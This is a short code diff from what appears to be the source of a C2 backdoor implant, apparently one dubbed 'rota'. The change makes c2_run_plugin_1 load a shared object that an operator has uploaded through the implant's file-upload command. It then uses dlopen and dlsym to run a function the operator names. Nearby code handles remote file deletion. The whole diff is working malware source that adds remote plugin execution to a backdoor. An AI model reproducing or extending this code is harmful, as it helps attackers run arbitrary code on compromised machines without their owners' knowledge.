@@ -137,8 +137,10 @@ bool c2_delete_file(char *fpath) {
 }
 
 
-void c2_run_plugin_1(char *soPath, char *funcName) {
+void c2_run_plugin_1(char *funcName) {
 
+    // SO expected to be uploaded via rota_c2_upload_file
+    char *soPath = "./local_rota_file.so";
     void *handle = dlopen(soPath, RTLD_LAZY);
     void (*func_ptr)() = dlsym(handle, funcName);
     // execution of shared object
